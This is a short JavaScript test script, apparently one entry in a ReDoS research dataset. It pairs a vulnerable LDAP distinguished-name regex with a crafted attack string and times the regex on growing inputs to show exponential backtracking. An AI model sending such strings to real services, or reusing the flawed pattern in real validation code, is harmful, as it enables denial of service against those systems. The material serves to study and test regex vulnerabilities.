/* 8286
 * ^((CN=(['\w\d\s\-\&amp;\.]+(\\/)*(\\,)*)+,\s*)*(OU=(['\w\d\s\-\&amp;\.]+(\\/)*(\\,)*)+,\s*)*(DC=['\w\d\s\-\&amp;]+[,]*\s*){1,}(DC=['\w\d\s\-\&amp;]+\s*){1})$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"DC='"+"DC=\t\t"*32+"! _1_EOA(i or ii)"
 */
var REGEX = new RegExp("^((CN=(['\w\d\s\-\&amp;\.]+(\\/)*(\\,)*)+,\s*)*(OU=(['\w\d\s\-\&amp;\.]+(\\/)*(\\,)*)+,\s*)*(DC=['\w\d\s\-\&amp;]+[,]*\s*){1,}(DC=['\w\d\s\-\&amp;]+\s*){1})$")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'DC=\'' + 'DC=\t\t'.repeat(i*1) + '! _1_EOA(i or ii)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}